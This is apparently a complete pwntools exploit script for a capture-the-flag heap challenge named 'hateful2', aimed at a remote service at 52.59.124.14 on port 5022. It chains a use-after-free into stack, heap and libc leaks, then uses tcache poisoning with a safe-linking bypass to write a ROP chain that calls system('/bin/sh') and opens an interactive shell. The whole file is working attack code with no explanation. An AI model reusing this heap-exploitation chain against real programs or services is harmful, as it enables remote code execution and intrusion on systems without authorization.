from pwn import *

context.binary = binary = ELF("./hateful2_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def add_message(idx, size, data):
	p.sendlineafter(b'>> ', b'1')
	p.sendlineafter(b': ', str(idx).encode())
	p.sendlineafter(b': ', str(size).encode())
	p.sendlineafter(b'>> ', data)

def edit_message(idx, data):
	p.sendlineafter(b'>> ', b'2')
	p.sendlineafter(b': ', str(idx).encode())
	p.sendlineafter(b'>> ', data)

def view_message(idx):
	p.sendlineafter(b'>> ', b'3')
	p.sendlineafter(b': ', str(idx).encode())
	p.recvuntil(b'Message: ')

	return p.recvline()[:-1]

def remove_message(idx):
	p.sendlineafter(b'>> ', b'4')
	p.sendlineafter(b': ', str(idx).encode())

#p = process()
p = remote('52.59.124.14', 5022)

p.sendline(b'0')
p.recvuntil(b'send up to ')

stack_leak = int(p.recvuntil(b' ')[:-1].decode())
info(f'0 stack leak: {hex(stack_leak)}')

add_message(0,0x20, b'1')
remove_message(0)

heap_leak = int(hex(u64(view_message(0).ljust(8, b'\x00')))+'000',16)
info(f'heap leak: {hex(heap_leak)}')

add_message(1, 0x500, b'AAAA')
add_message(2, 0x10, b'bbbb')

remove_message(1)

libc_leak = u64(view_message(1).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1d2cc0

info(f'libc_leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

rop = ROP(libc)
ropchain = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
ropchain += p64(next(libc.search(b'/bin/sh\x00')))
ropchain += p64(rop.find_gadget(['ret'])[0])
ropchain += p64(libc.symbols.system)

add_message(11, 0x100, b'AAAA')
add_message(12, 0x100, b'AAAA')

remove_message(11)
remove_message(12)
               
edit_message(12, p64(heap_leak >> 12 ^ (stack_leak+0xc)))
             
add_message(13, 0x100, b'AAAA')
add_message(14, 0x100, b'A' * 8 + ropchain)

p.recvrepeat(1)

print('*** SHELL ***')
p.interactive()
